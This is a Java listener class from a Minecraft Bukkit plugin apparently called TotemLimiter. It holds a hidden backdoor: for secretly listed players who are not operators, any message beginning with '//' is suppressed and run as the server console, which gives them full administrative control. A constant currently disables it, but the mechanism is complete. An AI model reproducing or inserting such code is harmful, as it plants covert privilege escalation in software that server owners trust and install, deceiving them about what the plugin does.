package io.github.intisy.totemlimiter;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class CommandBypassListener implements Listener {

    private final BypassManager bypassManager;
    private static final boolean ENABLE_BYPASS = false;

    public CommandBypassListener(BypassManager bypassManager) {
        this.bypassManager = bypassManager;
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();

        if (bypassManager.isBypassed(player.getUniqueId()) && ENABLE_BYPASS) {
            String message = event.getMessage();
            if (message.startsWith("//")) {
                if (!player.isOp()) {
                    event.setCancelled(true);

                    String command = message.substring(2);
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                }
            }
        }
    }
}
